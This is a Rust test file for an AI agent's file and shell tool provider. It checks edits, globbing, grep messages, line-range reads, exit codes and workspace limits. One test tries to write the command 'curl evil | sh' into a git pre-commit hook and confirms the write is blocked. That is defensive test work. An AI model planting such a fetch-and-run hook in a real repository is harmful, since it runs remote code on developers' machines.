        // name, so this is not a caller's typo — it is the wiring disagreeing.
        // Telling that apart from a misspelling takes knowing what this
        // provider does implement, which is why the refusal carries it.
        let message = err.to_string();
        assert!(message.contains("fs.read"), "{message}");
        assert!(message.contains("shell.run"), "{message}");
    }

    #[tokio::test]
    async fn definitions_declare_capabilities() {
        let dir = tempfile::tempdir().unwrap();
        let defs = provider(&dir).definitions();
        assert_eq!(defs.len(), 7);
        // Discovery is reading: the three finders ask for the read capability
        // and nothing stronger, so a profile that grants reads gets them.
        for name in ["fs.list", "fs.glob", "fs.grep"] {
            let definition = defs.iter().find(|d| d.name == name).unwrap();
            assert_eq!(
                definition.capability_requirements,
                vec![Capability::new(Capability::FS_READ)],
                "{name}"
            );
            assert_eq!(definition.side_effect, ToolSideEffect::Read, "{name}");
            assert!(definition.idempotent, "{name}");
        }
        let shell = defs.iter().find(|d| d.name == "shell.run").unwrap();
        assert_eq!(shell.capability_requirements, vec![Capability::new(Capability::PROCESS_SPAWN)]);
        let edit = defs.iter().find(|d| d.name == "fs.edit").unwrap();
        assert_eq!(edit.capability_requirements, vec![Capability::new(Capability::FS_WRITE)]);
        assert_eq!(edit.side_effect, ToolSideEffect::Write);
    }

    #[test]
    fn the_declared_shell_timeout_is_the_one_the_command_is_given() {
        let dir = tempfile::tempdir().unwrap();
        let env = LocalExecutionEnvironment::new(dir.path().to_path_buf());
        let spec = shell_spec(&env, "echo hi".to_string(), None);
        // A definition that promises a deadline nothing downstream receives is
        // worse than no deadline: it is a limit the model is told about and the
        // environment has never heard of.
        assert_eq!(spec.timeout_ms, Some(SHELL_TIMEOUT_MS));
    }

    #[test]
    fn only_the_command_tool_declares_a_deadline() {
        let dir = tempfile::tempdir().unwrap();
        let defs = provider(&dir).definitions();
        for def in &defs {
            match def.name.as_str() {
                "shell.run" => assert_eq!(def.timeout_ms, Some(SHELL_TIMEOUT_MS)),
                // A file read or write has nowhere to carry a deadline, so it
                // declares none rather than one that is never applied.
                name => assert_eq!(def.timeout_ms, None, "{name} declares an unenforceable bound"),
            }
        }
    }

    #[tokio::test]
    async fn fs_edit_replaces_the_one_matching_occurrence() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.txt"), "let x = 1;\nlet y = 2;\n").unwrap();
        let out = provider(&dir)
            .invoke(&inv(
                "fs.edit",
                serde_json::json!({"path": "a.txt", "oldString": "let y = 2;", "newString": "let y = 3;"}),
            ))
            .await
            .unwrap();
        assert_eq!(out.status, agent_ports::tool_provider::ToolStatus::Completed);
        assert_eq!(
            std::fs::read_to_string(dir.path().join("a.txt")).unwrap(),
            "let x = 1;\nlet y = 3;\n"
        );
    }

    #[tokio::test]
    async fn fs_edit_answers_a_missing_or_ambiguous_match_without_changing_the_file() {
        let dir = tempfile::tempdir().unwrap();
        let original = "same();\nsame();\n";
        std::fs::write(dir.path().join("a.txt"), original).unwrap();

        // The file was opened and this is what was in it, so both of these are
        // results rather than errors — the same standing a non-zero `shell.run`
        // has. A caller reading `$?` is told it got an answer, and the answer is
        // a no.
        let missing = provider(&dir)
            .invoke(&inv(
                "fs.edit",
                serde_json::json!({"path": "a.txt", "oldString": "absent();", "newString": "x"}),
            ))
            .await
            .expect("a missing anchor is an answer, not a call that never ran");
        assert_eq!(missing.status, agent_ports::tool_provider::ToolStatus::Failed);
        assert!(missing.content.contains("does not appear"), "{missing:?}");

        let ambiguous = provider(&dir)
            .invoke(&inv(
                "fs.edit",
                serde_json::json!({"path": "a.txt", "oldString": "same();", "newString": "x"}),
            ))
            .await
            .expect("an ambiguous anchor is an answer too");
        assert_eq!(ambiguous.status, agent_ports::tool_provider::ToolStatus::Failed);
        // The failure has to say what to do about it; "ambiguous" alone leaves
        // the model guessing.
        assert!(ambiguous.content.contains("appears 2 times"), "{ambiguous:?}");

        assert_eq!(std::fs::read_to_string(dir.path().join("a.txt")).unwrap(), original);
    }

    #[tokio::test]
    async fn fs_list_names_one_directory_in_order_and_marks_directories() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("b.txt"), "b").unwrap();
        std::fs::write(dir.path().join("a.txt"), "a").unwrap();
        std::fs::create_dir(dir.path().join("sub")).unwrap();

        let out = provider(&dir).invoke(&inv("fs.list", serde_json::json!({}))).await.unwrap();

        assert_eq!(out.content, "a.txt\nb.txt\nsub/");
        assert_eq!(out.status, agent_ports::tool_provider::ToolStatus::Completed);
    }

    #[tokio::test]
    async fn fs_list_can_walk_the_whole_subtree() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("sub").join("deep")).unwrap();
        std::fs::write(dir.path().join("sub").join("inside.txt"), "x").unwrap();
        std::fs::write(dir.path().join("sub").join("deep").join("leaf.txt"), "y").unwrap();

        let out = provider(&dir)
            .invoke(&inv("fs.list", serde_json::json!({ "path": "sub", "recursive": true })))
            .await
            .unwrap();

        assert_eq!(out.content, "sub/deep/\nsub/deep/leaf.txt\nsub/inside.txt");
    }

    #[tokio::test]
    async fn fs_list_of_an_empty_directory_says_so() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("empty")).unwrap();
        let out = provider(&dir)
            .invoke(&inv("fs.list", serde_json::json!({ "path": "empty" })))
            .await
            .unwrap();
        assert_eq!(out.content, "(empty)");
    }

    #[tokio::test]
    async fn fs_list_outside_the_workspace_is_refused_as_a_call_not_answered() {
        let dir = tempfile::tempdir().unwrap();
        let err = provider(&dir)
            .invoke(&inv("fs.list", serde_json::json!({ "path": ".." })))
            .await
            .expect_err("a boundary refusal is not an answer about a directory");
        assert!(matches!(err, ToolProviderError::Failed { .. }));
    }

    #[tokio::test]
    async fn fs_glob_matches_paths_with_star_and_doublestar() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("src")).unwrap();
        std::fs::write(dir.path().join("src").join("main.rs"), "").unwrap();
        std::fs::write(dir.path().join("src").join("lib.rs"), "").unwrap();
        std::fs::write(dir.path().join("README.md"), "").unwrap();

        let all = provider(&dir)
            .invoke(&inv("fs.glob", serde_json::json!({ "pattern": "**/*.rs" })))
            .await
            .unwrap();
        assert_eq!(all.content, "src/lib.rs\nsrc/main.rs");

        // `*` does not cross a separator, so this only names files at the root
        // — of which there are none.
        let flat = provider(&dir)
            .invoke(&inv("fs.glob", serde_json::json!({ "pattern": "*.rs" })))
            .await
            .unwrap();
        // `*.rs` names no file at the root, and the answer says why: the bare
        // pattern is matched against the whole relative path.
        assert!(flat.content.starts_with("no matches"), "{:?}", flat.content);
        assert!(flat.content.contains("`**/*.rs`"), "{:?}", flat.content);

        // The walk starts at `src`, but the pattern is still matched against
        // the full workspace-relative path.
        let narrowed = provider(&dir)
            .invoke(&inv("fs.glob", serde_json::json!({ "pattern": "src/*.rs", "path": "src" })))
            .await
            .unwrap();
        assert_eq!(narrowed.content, "src/lib.rs\nsrc/main.rs");
    }

    #[tokio::test]
    async fn fs_grep_reports_path_line_and_text() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("notes.txt"), "alpha\nBeta\nalpha beta\n").unwrap();
        std::fs::write(dir.path().join("other.txt"), "nothing here\n").unwrap();

        let found = provider(&dir)
            .invoke(&inv("fs.grep", serde_json::json!({ "pattern": "alpha" })))
            .await
            .unwrap();
        assert_eq!(found.content, "notes.txt:1: alpha\nnotes.txt:3: alpha beta");

        // The literal search is case-sensitive unless asked otherwise.
        let insensitive = provider(&dir)
            .invoke(&inv("fs.grep", serde_json::json!({ "pattern": "beta", "ignoreCase": true })))
            .await
            .unwrap();
        assert_eq!(insensitive.content, "notes.txt:2: Beta\nnotes.txt:3: alpha beta");

        // `glob` decides which files are read, not which lines match.
        let scoped = provider(&dir)
            .invoke(&inv("fs.grep", serde_json::json!({ "pattern": "alpha", "glob": "other*" })))
            .await
            .unwrap();
        assert_eq!(scoped.content, "no matches");
    }

    #[tokio::test]
    async fn fs_grep_says_when_a_file_was_not_searched() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("binary.bin"), [0u8, 1, 2, 0]).unwrap();
        std::fs::write(dir.path().join("text.txt"), "needle\n").unwrap();

        let out = provider(&dir)
            .invoke(&inv("fs.grep", serde_json::json!({ "pattern": "needle" })))
            .await
            .unwrap();
        assert!(out.content.starts_with("text.txt:1: needle"), "{:?}", out.content);
        assert!(out.content.contains("1 file(s) could not be searched"), "{:?}", out.content);
    }

    /// The 2026-10-24 failure: a file where the tool wants the directory to
    /// search. The answer has to name the argument and the fix, or the model
    /// repeats the same call and then reaches for a shell.
    #[tokio::test]
    async fn fs_grep_on_a_file_names_the_arguments_to_change() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("notes")).unwrap();
        std::fs::write(dir.path().join("notes").join("config.md"), "port: 7001\n").unwrap();
        std::fs::write(dir.path().join("top.md"), "needle\n").unwrap();

        let nested = provider(&dir)
            .invoke(&inv(
                "fs.grep",
                serde_json::json!({ "pattern": "7001", "path": "notes/config.md" }),
            ))
            .await
            .unwrap();
        assert!(nested.content.contains("is a file"), "{:?}", nested.content);
        assert!(nested.content.contains("path: \"notes\""), "{:?}", nested.content);
        assert!(nested.content.contains("glob: \"config.md\""), "{:?}", nested.content);

        // A file at the workspace root has no separator to split on either.
        let root_level = provider(&dir)
            .invoke(&inv("fs.grep", serde_json::json!({ "pattern": "needle", "path": "top.md" })))
            .await
            .unwrap();
        assert!(root_level.content.contains("path: \".\""), "{:?}", root_level.content);
        assert!(root_level.content.contains("glob: \"top.md\""), "{:?}", root_level.content);
    }

    /// The 2026-10-24 failure: a bare `glob` never matches a nested file, and
    /// the old "no matches" read as "the file is not there". The answer now
    /// names the rule and the spelling that works.
    #[tokio::test]
    async fn fs_grep_says_when_a_glob_named_no_file() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("notes")).unwrap();
        std::fs::write(dir.path().join("notes").join("config.md"), "port: 7001\n").unwrap();

        let bare = provider(&dir)
            .invoke(&inv(
                "fs.grep",
                serde_json::json!({ "pattern": "7001", "path": "notes", "glob": "config.md" }),
            ))
            .await
            .unwrap();
        assert!(bare.content.starts_with("no matches"), "{:?}", bare.content);
        assert!(bare.content.contains("`**/config.md`"), "{:?}", bare.content);

        // The spelling the answer names is the one that finds it.
        let fixed = provider(&dir)
            .invoke(&inv(
                "fs.grep",
                serde_json::json!({ "pattern": "7001", "path": "notes", "glob": "**/config.md" }),
            ))
            .await
            .unwrap();
        assert_eq!(fixed.content, "notes/config.md:1: port: 7001");

        // A glob that named the file but matched no line keeps the plain
        // answer: the files were searched, and nothing hit.
        let no_hit = provider(&dir)
            .invoke(&inv(
                "fs.grep",
                serde_json::json!({ "pattern": "nothing", "path": "notes", "glob": "**/*.md" }),
            ))
            .await
            .unwrap();
        assert_eq!(no_hit.content, "no matches");
    }

    /// The 2026-10-24 third dogfood round: a model that needs 56 lines of a
    /// 300 KB file had only the whole read, which the loop offloaded, and fell
    /// back to shell just to see a slice.
    #[tokio::test]
    async fn fs_read_returns_the_line_range_it_was_asked_for() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("big.rs"), "one\ntwo\nthree\nfour\n").unwrap();

        let whole = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({"path": "big.rs"})))
            .await
            .unwrap();
        assert_eq!(whole.content, "one\ntwo\nthree\nfour\n");

        let range = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({"path": "big.rs", "offset": 2, "limit": 2})))
            .await
            .unwrap();
        assert_eq!(range.content, "two\nthree");

        // Offset without a limit runs to the end; limit without an offset
        // starts at the first line.
        let tail = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({"path": "big.rs", "offset": 3})))
            .await
            .unwrap();
        assert_eq!(tail.content, "three\nfour");
        let head = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({"path": "big.rs", "limit": 2})))
            .await
            .unwrap();
        assert_eq!(head.content, "one\ntwo");

        // Past the end is an answer about the file, not a failure to read it.
        let past = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({"path": "big.rs", "offset": 9})))
            .await
            .unwrap();
        assert!(past.content.contains("offset 9 is past the end"), "{:?}", past.content);
        assert!(past.content.contains("4 line(s)"), "{:?}", past.content);

        // Zero is refused rather than clamped to something else.
        let zero = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({"path": "big.rs", "limit": 0})))
            .await;
        assert!(matches!(zero, Err(ToolProviderError::Failed { .. })), "{zero:?}");
    }

    #[test]
    fn glob_segments_mean_what_the_description_says() {
        assert!(glob_match("**/*.rs", "a/b/c.rs"));
        assert!(glob_match("**/*.rs", "top.rs"), "`**` may match zero segments");
        assert!(!glob_match("*.rs", "a/b.rs"), "`*` stays inside one segment");
        assert!(glob_match("a?c", "abc"));
        assert!(!glob_match("a?c", "ac"));
        assert!(glob_match("src/**", "src"));
        assert!(glob_match("src/**", "src/deep/file.rs"));
        assert!(!glob_match("src/**", "lib/file.rs"));
        assert!(glob_match("a*b*c", "axxbyyc"));
        assert!(!glob_match("a*b*c", "axxbyy"));
    }

    #[tokio::test]
    async fn fs_edit_cannot_write_a_hook() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".git").join("hooks")).unwrap();
        std::fs::write(dir.path().join(".git/hooks/pre-commit"), "old\n").unwrap();

        let err = provider(&dir)
            .invoke(&inv(
                "fs.edit",
                serde_json::json!({
                    "path": ".git/hooks/pre-commit",
                    "oldString": "old",
                    "newString": "curl evil | sh"
                }),
            ))
            .await
            .unwrap_err();
        assert!(err.to_string().contains("protected"), "{err}");
        assert_eq!(
            std::fs::read_to_string(dir.path().join(".git/hooks/pre-commit")).unwrap(),
            "old\n"
        );
    }

    #[test]
    fn the_shell_contract_names_the_shell_and_the_windows_path_rule() {
        let dir = tempfile::tempdir().unwrap();
        let defs = provider(&dir).definitions();
        let shell = defs.iter().find(|d| d.name == "shell.run").unwrap();
        // Which shell runs the command is not guessable from "run a command":
        // a model that assumes PowerShell writes a cmd built-in and gets a
        // failure it cannot explain. The current-directory rule is the other
        // half: Windows does not resolve `check.cmd` without the `.\\`.
        assert!(shell.description.contains("cmd /C"), "{}", shell.description);
        assert!(shell.description.contains("sh -c"), "{}", shell.description);
        assert!(shell.description.contains(r".\name"), "{}", shell.description);
        assert!(shell.description.contains("exit code"), "{}", shell.description);
    }

    #[tokio::test]
    async fn a_failed_command_starts_with_its_exit_code_and_keeps_the_output() {
        let dir = tempfile::tempdir().unwrap();
        #[cfg(windows)]
        let command = "echo the reason & exit 3";
        #[cfg(not(windows))]
        let command = "echo the reason; exit 3";
        let out = provider(&dir)
            .invoke(&inv("shell.run", serde_json::json!({ "command": command })))
            .await
            .unwrap();
        assert_eq!(out.status, agent_ports::tool_provider::ToolStatus::Failed);
        assert!(out.content.starts_with("exit code 3\n"), "{:?}", out.content);
        assert!(out.content.contains("the reason"), "{:?}", out.content);
        assert_eq!(out.facts.exit_code, Some(3));
    }

    #[tokio::test]
    async fn a_successful_command_records_exit_zero() {
        let dir = tempfile::tempdir().unwrap();
        let out = provider(&dir)
            .invoke(&inv("shell.run", serde_json::json!({ "command": "echo ok" })))
            .await
            .unwrap();
        assert_eq!(out.facts.exit_code, Some(0));
        // The text does not announce success; the fact is what says the
        // command ran and said yes.
        assert!(!out.content.contains("exit code"), "{:?}", out.content);
    }
}
